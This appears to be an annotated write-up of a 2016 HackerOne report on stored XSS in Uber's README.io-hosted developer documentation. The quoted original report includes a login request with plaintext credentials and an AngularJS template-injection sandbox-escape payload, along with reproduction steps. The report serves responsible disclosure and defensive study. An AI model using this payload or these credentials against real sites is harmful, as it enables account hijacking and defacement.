# Stored XSS in developer.uber.com via README.io Suggested Edits

## Metadata
- **Source:** HackerOne
- **Report:** 131450 | https://hackerone.com/reports/131450
- **Submitted:** 2016-04-16
- **Reporter:** albinowax
- **Program:** Uber
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Stored Cross-Site Scripting (XSS), Broken Authentication, Insufficient Input Validation, Inadequate Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can authenticate to the README.io backend using weak credentials, submit malicious JavaScript payloads through the suggested edits feature, and achieve persistent XSS on all developer.uber.com documentation pages. When administrators review suggested edits, the injected code executes, potentially allowing attackers to hijack developer accounts and automatically approve malicious changes.

## Attack scenario
1. Attacker visits uber.readme.io/docs/deep-linking to obtain initial connect.sid session cookie
2. Attacker authenticates using known/weak credentials (readme2@thursday.eml.cc) via POST /users/session endpoint
3. Attacker obtains new authenticated connect.sid cookie containing admin user session
4. Attacker navigates to /docs/deep-linking/edit and crafts AngularJS template injection payload leveraging prototype pollution gadget chain
5. Attacker submits malicious payload via suggested edits feature with arbitrary description
6. Administrator reviews suggestion on README dashboard; injected JavaScript executes in admin context, allowing account hijacking or auto-approval of further malicious edits

## Root cause
Multiple layered failures: (1) Weak authentication credentials exposed in documentation/testing environment, (2) Insufficient input sanitization in suggested edits feature, (3) AngularJS expression binding enabled on user-controlled content without ng-nonbindable directive, (4) No output encoding applied to suggested edit content, (5) Lack of domain isolation between third-party documentation platform and primary developer domain

## Attacker mindset
Reconnaissance-focused attacker identified weak credentials in public documentation, chained authentication bypass with template injection expertise, and recognized the suggested edits workflow as an administrative approval vector. Likely motivated by persistent access to developer ecosystem or supply chain compromise of API integrations.

## Defensive takeaways
- Never use real/shared credentials in public documentation or testing environments; use isolated test accounts with minimal privileges
- Implement strict Content Security Policy (CSP) headers preventing inline script execution
- Apply output encoding (HTML entity encoding) to all user-controlled content before rendering, especially in templating engines
- Disable AngularJS expression binding in user-facing content using ng-nonbindable directive
- Implement whitelist-based HTML sanitization library (DOMPurify, sanitize-html) for suggested edits
- Isolate third-party documentation platforms on separate domain to prevent session/credential leakage to primary application domain
- Require secondary authentication or manual approval workflow for suggested edits before display
- Implement input validation restricting suggested edits to plain text with markdown, excluding template syntax
- Audit and rotate all test/development credentials regularly
- Monitor for suspicious administrative activity (bulk edit approvals, script injection attempts)

## Variant hunting
Test other suggested edit workflows or comment systems on README.io for similar XSS vectors
Enumerate other README.io endpoints for authentication bypass (password reset, session fixation)
Check for CSRF in suggested edits approval workflow allowing unauthenticated exploitation
Investigate if other AngularJS prototype pollution gadget chains work on this version
Search for similar weak credentials patterns in other Uber documentation or development environments
Test README.io API endpoints for privilege escalation from regular user to admin/reviewer role
Check if payload reflects in email notifications sent to admins (out-of-band XSS vector)
Investigate stored XSS in other README.io content types (code blocks, API examples, FAQs)

## MITRE ATT&CK
- T1190
- T1566
- T1199
- T1583
- T1589
- T1598
- T1621
- T1556
- T1539
- T1570

## Notes
Report demonstrates exceptional security research combining multiple vulnerability classes (weak auth + XSS + template injection) into a practical exploitation chain. The attacker's recommendation to domain-isolate third-party services shows mature security thinking. README.io's weak posture appears systemic; Uber should consider migrating to self-hosted or more security-conscious documentation platforms. The JavaScript gadget chain using prototype pollution and constructor access bypasses basic XSS filters, indicating need for framework-level protections rather than blacklist-based filtering.

## Full report
<details><summary>Expand</summary>

An attacker can make a series of requests to https://uber.readme.io/ that will result in permanent defacement/stored XSS of all the documentation pages on https://developer.uber.com/

I'm not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you'd like to know either way. 


Reproduction steps:

Load https://uber.readme.io/docs/deep-linking to get a connect.sid cookie
Authenticate the session by sending the following request to uber.readme.io:
```
POST /users/session HTTP/1.1
Host: uber.readme.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 84
Cookie: YOUR CONNECT.SID COOKIE HERE
Connection: close
Pragma: no-cache
Cache-Control: no-cache

{"email":"readme2@thursday.eml.cc","password":"pjJnBODjkLFv!!11","action":"session"}
```

If this worked, you'll see a response body something like 
```
{"id":"57129b7365324b0e002ad83b","name":"James Kettle","email":"readme2@thursday.eml.cc","username":"","provider":"local","createdAt":"2016-04-16T20:07:15.871Z","accessToken":"","stripeId":"","hasStripe":false,"email_verified":false,"hasGithub":false,"github":{},"is_admin":false,"is_god":false}
```
Grab the new connect.sid cookie from this response.

Using the new connect.sid cookie value, load https://uber.readme.io/docs/deep-linking/edit - you should land on a 'Suggest edits' page (see screenshot)

Add the following payload into the document:
```{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}```
Then enter an arbitrary description then press 'suggest edits'. 

When an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.

Congrats, you've now got your own JavaScript executing on https://uber.readme.io/docs/deep-linking - potentially hijacking the account of every developer who views it. 

The obvious way to patch this is using the ng-nonbindable directive to nullify the stored-xss-via-suggested-edits problem. However, since readme.io appears to have a weak security posture, it may be worth considering shifting the readme.io-powered documentation to a separate domain from developer.uber.com, to ensure that XSS in readme.io can't hijack developer accounts.

Let me know if a video would be helpful.

</details>

---
*Analysed by Claude on 2026-05-12*
